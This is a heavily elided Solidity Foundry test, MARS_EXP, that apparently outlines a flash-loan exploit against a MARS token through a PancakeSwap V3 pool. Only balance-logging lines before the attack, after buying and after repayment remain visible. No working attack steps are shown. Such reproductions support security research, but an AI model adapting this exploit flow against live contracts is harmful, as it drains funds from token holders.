...
IPancakeV3Pool constant v3pair = IPancakeV3Pool(
...
contract MARS_EXP is Test {
    ...
    function pancakeV3FlashCallback(
        ...
        emit log_named_uint(
            "WBNB balance before Attack",
            bnb.balanceOf(address(this)) / 1 ether
        );
        ...
        emit log_named_uint(
            "MARS After buying",
            MARS.balanceOf(address(this)) / 1 ether
        );
        emit log_named_uint(
            "BNB After buying",
            bnb.balanceOf(address(this)) / 1 ether
        ...
        emit log_named_uint(
            "WBNB balance After Paying back",
            bnb.balanceOf(address(this)) / 1 ether
        );
    }
}
